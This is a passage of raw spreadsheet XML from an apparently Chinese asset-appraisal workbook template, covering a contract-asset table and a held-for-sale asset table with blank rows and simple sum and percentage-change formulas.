    <mergeCell ref="B2:I2"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B1:I1"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="D5:D6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:I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2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 codeName="Sheet3637">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A27" sqref="A27:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.5" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="17.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="18.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="12.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="15.8333333333333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合同资产评估明细表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373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="402" t="inlineStr">
        <is>
          <t>表3-10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项目及内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>结算内容</t>
        </is>
      </c>
      <c r="F5" s="380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6.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="3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Height="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="115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Height="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="115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6.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="115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6.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="115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Height="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="115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Height="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="115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Height="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="115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Height="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="115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Height="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="115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Height="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="115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Height="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="115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Height="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="115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Height="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="115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Height="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="115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Height="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="115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Height="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="115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Height="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="115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Height="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="115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Height="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="115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115" t="n"/>
      <c r="E26" s="115" t="n"/>
      <c r="F26" s="555">
        <f>SUM(F6:F25)</f>
        <v/>
      </c>
      <c r="G26" s="555">
        <f>SUM(G6:G25)</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：合同资产减值准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="115" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>预计风险</t>
        </is>
      </c>
      <c r="B28" s="185" t="inlineStr">
        <is>
          <t>减：合同资产减值损失</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="115" t="n"/>
      <c r="E28" s="115" t="n"/>
      <c r="F28" s="555" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>G28-F28</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>IF(F28=0,"",H28/F28*100)</f>
        <v/>
      </c>
      <c r="J28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="115" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="555">
        <f>F26-F27</f>
        <v/>
      </c>
      <c r="G29" s="555">
        <f>G26-G28</f>
        <v/>
      </c>
      <c r="H29" s="555">
        <f>G29-F29</f>
        <v/>
      </c>
      <c r="I29" s="555">
        <f>IF(F29=0,"",H29/F29*100)</f>
        <v/>
      </c>
      <c r="J29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B2:J2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J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5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 codeName="Sheet37">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M33"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="13.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="19.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="20.3333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="11" customWidth="1" style="410" min="7" max="7"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="10.3333333333333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持有待售资产评估明细表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373" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表3-11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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="21" customFormat="1" customHeight="1" s="204">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="185" t="inlineStr">
        <is>
          <t>资产名称</t>
        </is>
      </c>
      <c r="D5" s="185" t="inlineStr">
        <is>
          <t>规格型号</t>
        </is>
      </c>
      <c r="E5" s="185" t="inlineStr">
        <is>
          <t>生产厂家</t>
        </is>
      </c>
      <c r="F5" s="185" t="inlineStr">
        <is>
          <t>原始入账日期</t>
        </is>
      </c>
      <c r="G5" s="185" t="inlineStr">
        <is>
          <t>启用日期</t>
        </is>
      </c>
      <c r="H5" s="185" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>账面价值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Height="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="381" t="n"/>
      <c r="E6" s="381" t="n"/>
      <c r="F6" s="587" t="n"/>
      <c r="G6" s="587" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-I6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(I6=0,"",K6/I6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="381" t="n"/>
      <c r="F7" s="587" t="n"/>
      <c r="G7" s="587" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-I7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(I7=0,"",K7/I7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="587" t="n"/>
      <c r="G8" s="587" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-I8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(I8=0,"",K8/I8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="587" t="n"/>
      <c r="G9" s="587" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-I9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(I9=0,"",K9/I9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="587" t="n"/>
      <c r="G10" s="587" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-I10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(I10=0,"",K10/I10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="587" t="n"/>
      <c r="G11" s="587" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-I11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(I11=0,"",K11/I11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="587" t="n"/>
      <c r="G12" s="587" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-I12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(I12=0,"",K12/I12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="587" t="n"/>
      <c r="G13" s="587" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-I13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(I13=0,"",K13/I13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="587" t="n"/>
      <c r="G14" s="587" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-I14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(I14=0,"",K14/I14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="587" t="n"/>
      <c r="G15" s="587" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-I15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(I15=0,"",K15/I15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="587" t="n"/>
      <c r="G16" s="587" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-I16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(I16=0,"",K16/I16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="587" t="n"/>
      <c r="G17" s="587" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-I17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(I17=0,"",K17/I17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="587" t="n"/>
      <c r="G18" s="587" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-I18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(I18=0,"",K18/I18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="587" t="n"/>
      <c r="G19" s="587" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-I19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(I19=0,"",K19/I19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="587" t="n"/>
      <c r="G20" s="587" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-I20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(I20=0,"",K20/I20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="587" t="n"/>
      <c r="G21" s="587" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-I21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(I21=0,"",K21/I21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="587" t="n"/>
      <c r="G22" s="587" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-I22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(I22=0,"",K22/I22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="587" t="n"/>
      <c r="G23" s="587" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-I23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(I23=0,"",K23/I23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="587" t="n"/>
      <c r="G24" s="587" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-I24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(I24=0,"",K24/I24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="587" t="n"/>
      <c r="G25" s="587" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-I25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(I25=0,"",K25/I25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="587" t="n"/>
      <c r="G26" s="587" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-I26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(I26=0,"",K26/I26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="381" t="n"/>
      <c r="F27" s="587" t="n"/>
      <c r="G27" s="587" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-I27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(I27=0,"",K27/I27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="381" t="n"/>
      <c r="E28" s="381" t="n"/>
      <c r="F28" s="587" t="n"/>
      <c r="G28" s="587" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>J28-I28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(I28=0,"",K28/I28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="381" t="n"/>
      <c r="E29" s="381" t="n"/>
      <c r="F29" s="587" t="n"/>
      <c r="G29" s="587" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="555" t="n"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555">
        <f>J29-I29</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>IF(I29=0,"",K29/I29*100)</f>
        <v/>
      </c>
      <c r="M29" s="383" t="n"/>
    </row>
    <row r="30" ht="18" customHeight="1" s="415">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B30" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C30" s="567" t="n"/>
      <c r="D30" s="307" t="n"/>
      <c r="E30" s="307" t="n"/>
      <c r="F30" s="383" t="n"/>
      <c r="G30" s="565" t="n"/>
      <c r="H30" s="555">
        <f>ROUND(SUM(H6:H29),2)</f>
        <v/>
      </c>
      <c r="I30" s="555">
        <f>ROUND(SUM(I6:I29),2)</f>
        <v/>
      </c>
      <c r="J30" s="555">
        <f>ROUND(SUM(J6:J29),2)</f>
        <v/>
      </c>
      <c r="K30" s="555">
        <f>J30-I30</f>
        <v/>
      </c>
      <c r="L30" s="555">
        <f>IF(I30=0,"",K30/I30*100)</f>
        <v/>
      </c>
      <c r="M30" s="383" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="B31" s="299" t="n"/>
      <c r="C31" s="300" t="n"/>
      <c r="D31" s="300" t="n"/>
      <c r="E31" s="300" t="n"/>
      <c r="F31" s="300" t="n"/>
      <c r="G31" s="300" t="n"/>
      <c r="H31" s="345" t="n"/>
      <c r="I31" s="302" t="n"/>
      <c r="J31" s="302" t="n"/>
      <c r="K31" s="302" t="n"/>
      <c r="L31" s="302" t="n"/>
      <c r="M31" s="302" t="n"/>
    </row>
    <row r="32" s="415">
      <c r="B32" s="303" t="n"/>
      <c r="C32" s="156" t="inlineStr">
        <is>
          <t>注：</t>
        </is>
      </c>
      <c r="D32" s="347" t="n"/>
      <c r="E32" s="347" t="n"/>
      <c r="F32" s="347" t="n"/>
      <c r="G32" s="347" t="n"/>
      <c r="H32" s="347" t="n"/>
      <c r="I32" s="347" t="n"/>
      <c r="J32" s="347" t="n"/>
      <c r="K32" s="347" t="n"/>
      <c r="L32" s="347" t="n"/>
      <c r="M32" s="347" t="n"/>
    </row>
    <row r="33" s="415">
      <c r="B33" s="347" t="n"/>
      <c r="C33" s="116" t="inlineStr">
        <is>
          <t>只有待售资产的种类较多，本表涉及仅以待售资产为设备类资产为例。若待售资产为自用房产等，请相应修改参数。</t>
        </is>
      </c>
      <c r="D33" s="347" t="n"/>
      <c r="E33" s="347" t="n"/>
      <c r="F33" s="347" t="n"/>
      <c r="G33" s="347" t="n"/>
      <c r="H33" s="347" t="n"/>
      <c r="I33" s="347" t="n"/>
      <c r="J33" s="347" t="n"/>
      <c r="K33" s="347" t="n"/>
      <c r="L33" s="347" t="n"/>
      <c r="M33" s="347" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B30:C30"/>
    <mergeCell ref="B1:M1"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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 codeName="Sheet38">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J30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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="2" max="2"/>
